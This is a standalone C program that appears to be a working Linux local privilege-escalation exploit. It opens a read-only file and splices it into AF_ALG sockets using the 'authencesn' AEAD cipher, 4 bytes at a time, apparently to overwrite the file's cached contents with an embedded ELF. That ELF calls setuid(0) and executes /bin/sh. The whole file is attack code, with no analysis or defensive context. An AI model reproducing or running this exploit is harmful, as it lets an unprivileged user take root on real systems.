#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/if_alg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

enum {
    AEAD_AUTH_SIZE = 4,
    AEAD_ASSOC_DATA_LEN = 8,
    AEAD_IV_LEN = 16,
    CHUNK_SIZE = 4,
    RECV_BUFFER_SIZE = 4096,
};

struct aead_request_state {
    unsigned char header[CHUNK_SIZE];
    unsigned char control[CMSG_SPACE(sizeof(uint32_t)) +
                          CMSG_SPACE(sizeof(struct af_alg_iv) + AEAD_IV_LEN) +
                          CMSG_SPACE(sizeof(uint32_t))];
    struct iovec iov[2];
    struct msghdr msg;
};

static const char *kAlgType = "aead";
static const char *kAlgName = "authencesn(hmac(sha256),cbc(aes))";
static const unsigned char kKey[] = {
    0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};
static const unsigned char kPayload[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x9e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9e, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x31, 0xc0, 0x31, 0xff, 0xb0, 0x69, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x0f,
    0x00, 0x00, 0x00, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05, 0x31,
    0xff, 0x6a, 0x3c, 0x58, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
    0x68, 0x00, 0x00, 0x00,
};

static void print_errno_context(const char *context)
{
    fprintf(stderr, "%s: %s\n", context, strerror(errno));
}

static int open_alg_socket(void)
{
    struct sockaddr_alg addr;
    int alg_fd;

    memset(&addr, 0, sizeof(addr));
    addr.salg_family = AF_ALG;
    strcpy((char *)addr.salg_type, kAlgType);
    strcpy((char *)addr.salg_name, kAlgName);

    alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) {
        print_errno_context("open_alg_socket socket(AF_ALG)");
        return -1;
    }

    if (bind(alg_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        print_errno_context("open_alg_socket bind(AF_ALG)");
        close(alg_fd);
        return -1;
    }

    return alg_fd;
}

static int configure_alg_socket(int alg_fd)
{
    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, kKey, sizeof(kKey)) < 0) {
        print_errno_context("configure_alg_socket setsockopt(ALG_SET_KEY)");
        return -1;
    }

    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, AEAD_AUTH_SIZE) < 0) {
        print_errno_context("configure_alg_socket setsockopt(ALG_SET_AEAD_AUTHSIZE)");
        return -1;
    }

    return 0;
}

static void init_aead_request_state(struct aead_request_state *request,
                                    const unsigned char *chunk,
                                    size_t chunk_len)
{
    struct cmsghdr *cmsg;
    struct af_alg_iv *iv;
    uint32_t op = 0;
    uint32_t assoc_len = AEAD_ASSOC_DATA_LEN;

    memset(request, 0, sizeof(*request));
    memset(request->header, 'A', sizeof(request->header));

    request->iov[0].iov_base = request->header;
    request->iov[0].iov_len = sizeof(request->header);
    request->iov[1].iov_base = (void *)chunk;
    request->iov[1].iov_len = chunk_len;

    request->msg.msg_iov = request->iov;
    request->msg.msg_iovlen = 2;
    request->msg.msg_control = request->control;
    request->msg.msg_controllen = sizeof(request->control);

    cmsg = CMSG_FIRSTHDR(&request->msg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_OP;
    cmsg->cmsg_len = CMSG_LEN(sizeof(op));
    memcpy(CMSG_DATA(cmsg), &op, sizeof(op));

    cmsg = CMSG_NXTHDR(&request->msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_IV;
    cmsg->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + AEAD_IV_LEN);

    iv = (struct af_alg_iv *)CMSG_DATA(cmsg);
    iv->ivlen = AEAD_IV_LEN;
    memset(iv->iv, 0, AEAD_IV_LEN);

    cmsg = CMSG_NXTHDR(&request->msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
    cmsg->cmsg_len = CMSG_LEN(sizeof(assoc_len));
    memcpy(CMSG_DATA(cmsg), &assoc_len, sizeof(assoc_len));
}

static int send_aead_request(int op_fd, const unsigned char *chunk, size_t chunk_len)
{
    struct aead_request_state request;

    init_aead_request_state(&request, chunk, chunk_len);

    if (sendmsg(op_fd, &request.msg, MSG_MORE) < 0) {
        print_errno_context("send_aead_request sendmsg");
        return -1;
    }

    return 0;
}

static int splice_exact(int fd_in, loff_t *offset_in, int fd_out, size_t bytes, const char *label)
{
    ssize_t copied = splice(fd_in, offset_in, fd_out, NULL, bytes, 0);

    if (copied < 0) {
        print_errno_context(label);
        return -1;
    }

    if ((size_t)copied != bytes) {
        fprintf(stderr, "%s: expected %zu bytes, got %zd\n", label, bytes, copied);
        return -1;
    }

    return 0;
}

static int process_chunk(int input_fd, size_t chunk_offset, const unsigned char *chunk, size_t chunk_len)
{
    int alg_fd = -1;
    int op_fd = -1;
    int pipefd[2] = {-1, -1};
    size_t bytes_to_splice = chunk_offset + CHUNK_SIZE;
    loff_t input_offset = 0;
    unsigned char recv_buffer[RECV_BUFFER_SIZE];
    int status = -1;

    alg_fd = open_alg_socket();
    if (alg_fd < 0)
        goto cleanup;

    if (configure_alg_socket(alg_fd) != 0)
        goto cleanup;

    op_fd = accept(alg_fd, NULL, 0);
    if (op_fd < 0) {
        print_errno_context("process_chunk accept");
        goto cleanup;
    }

    if (send_aead_request(op_fd, chunk, chunk_len) != 0)
        goto cleanup;

    if (pipe(pipefd) < 0) {
        print_errno_context("process_chunk pipe");
        goto cleanup;
    }

    /* Match Python's os.splice(..., offset_src=0): each iteration reads from file offset 0. */
    if (splice_exact(input_fd, &input_offset, pipefd[1], bytes_to_splice, "splice input -> pipe") != 0)
        goto cleanup;

    if (splice_exact(pipefd[0], NULL, op_fd, bytes_to_splice, "splice pipe -> socket") != 0)
        goto cleanup;

    (void)recv(op_fd, recv_buffer, AEAD_ASSOC_DATA_LEN + chunk_offset, 0);
    status = 0;

cleanup:
    if (pipefd[0] >= 0)
        close(pipefd[0]);
    if (pipefd[1] >= 0)
        close(pipefd[1]);
    if (op_fd >= 0)
        close(op_fd);
    if (alg_fd >= 0)
        close(alg_fd);

    return status;
}

int main(int argc, char **argv)
{
    const char *input_path;
    const unsigned char *payload = kPayload;
    size_t payload_len = sizeof(kPayload);
    int input_fd = -1;
    int exit_code = 1;

    if (argc != 2) {
        fprintf(stderr, "usage: %s <input_path>\n", argv[0]);
        return 1;
    }

    input_path = argv[1];

    input_fd = open(input_path, O_RDONLY);
    if (input_fd < 0) {
        print_errno_context("main open input file");
        return 1;
    }

    for (size_t chunk_offset = 0; chunk_offset < payload_len; chunk_offset += CHUNK_SIZE) {
        size_t remaining = payload_len - chunk_offset;
        size_t chunk_len = remaining < CHUNK_SIZE ? remaining : CHUNK_SIZE;

        if (process_chunk(input_fd, chunk_offset, payload + chunk_offset, chunk_len) != 0)
            goto cleanup;
    }

    exit_code = 0;

cleanup:
    close(input_fd);
    return exit_code;
}
